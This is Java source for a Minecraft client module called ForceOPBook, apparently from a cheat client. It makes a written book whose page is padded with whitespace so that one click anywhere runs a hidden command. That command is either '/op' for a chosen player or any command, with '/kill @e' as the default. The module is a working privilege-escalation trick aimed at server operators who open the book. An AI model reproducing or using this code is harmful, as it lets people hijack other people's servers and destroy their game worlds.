package dev.mlml.korppu.module.modules;

import dev.mlml.korppu.KorppuMod;
import dev.mlml.korppu.config.ListSetting;
import dev.mlml.korppu.config.StringSetting;
import dev.mlml.korppu.gui.ChatHelper;
import dev.mlml.korppu.mixin.IPlayerInventoryMixin;
import dev.mlml.korppu.module.Module;
import dev.mlml.korppu.module.StatusEntry;
import net.minecraft.core.component.DataComponents;
import net.minecraft.world.item.component.WrittenBookContent;
import net.minecraft.world.item.ItemStack;
import net.minecraft.world.item.Items;
import net.minecraft.world.inventory.ContainerInput;
import net.minecraft.network.chat.ClickEvent;
import net.minecraft.network.chat.MutableComponent;
import net.minecraft.server.network.Filterable;
import net.minecraft.network.chat.Component;
import org.lwjgl.glfw.GLFW;

import java.util.ArrayList;
import java.util.List;

public class ForceOPBook extends Module {
    private final ListSetting<Mode> mode = config.add(new ListSetting<>("Mode", "Payload mode", Mode.ForceOP));
    private final StringSetting target = config.add(new StringSetting("Target", "Player to OP in ForceOP mode", "Player").showOnlyIf(() -> mode.getValue() == Mode.ForceOP));
    private final StringSetting command = config.add(new StringSetting("Command", "Command in AnyCommand mode", "/kill @e").showOnlyIf(() -> mode.getValue() == Mode.AnyCommand));
    private final StringSetting title = config.add(new StringSetting("Title", "Book title", "Book and Quill"));
    private final StringSetting author = config.add(new StringSetting("Author", "Book author", " "));
    private final StringSetting text = config.add(new StringSetting("Component", "Clickable page text", "click here"));

    public ForceOPBook() {
        super("ForceOPBook", "Requires creative mode; creates a clickable command book", GLFW.GLFW_KEY_UNKNOWN);
    }

    @Override
    public void onEnable() {
        setEnabled(false);
        if (KorppuMod.mc.player == null || KorppuMod.mc.gameMode == null) return;

        if (!KorppuMod.mc.player.getAbilities().instabuild) {
            ChatHelper.message("ForceOPBook requires creative mode.");
            return;
        }

        ItemStack stack = new ItemStack(Items.WRITTEN_BOOK);
        String clickCommand = mode.getValue() == Mode.ForceOP
                ? "/op " + sanitizedTarget()
                : sanitizedCommand();

        String label = text.getValue().trim().isEmpty() ? "click here" : text.getValue();
        MutableComponent pageText = Component.literal(label + "                                                                                                                                ")
                .withStyle(style -> style.withClickEvent(new ClickEvent.RunCommand(clickCommand)));

        List<Filterable<Component>> pages = new ArrayList<>();
        pages.add(Filterable.passThrough(pageText));

        WrittenBookContent content = new WrittenBookContent(
                Filterable.passThrough(title.getValue()),
                author.getValue(),
                0,
                pages,
                true
        );
        stack.set(DataComponents.WRITTEN_BOOK_CONTENT, content);

        int selectedSlot = ((IPlayerInventoryMixin) (Object) KorppuMod.mc.player.getInventory()).getSelectedSlot();
        int slot = 36 + selectedSlot;
        KorppuMod.mc.gameMode.handleCreativeModeItemAdd(stack, slot);
        KorppuMod.mc.gameMode.handleContainerInput(KorppuMod.mc.player.containerMenu.containerId, slot, 0, ContainerInput.PICKUP, KorppuMod.mc.player);
        KorppuMod.mc.gameMode.handleContainerInput(KorppuMod.mc.player.containerMenu.containerId, slot, 0, ContainerInput.PICKUP, KorppuMod.mc.player);
    }

    private String sanitizedTarget() {
        String value = target.getValue().trim();
        if (!value.isEmpty()) return value;
        if (KorppuMod.mc.player != null) return KorppuMod.mc.player.getName().getString();
        return "Player";
    }

    private String sanitizedCommand() {
        String value = command.getValue().trim();
        if (value.isEmpty()) return "kill @e";
        return value.startsWith("/") ? value : "/" + value;
    }

    @Override
    public List<StatusEntry> getStatusEntries() {
        return List.of(
                StatusEntry.text("Mode", mode.getValue().name()),
                StatusEntry.text("Target", sanitizedTarget())
        );
    }

    public enum Mode {
        ForceOP,
        AnyCommand
    }
}
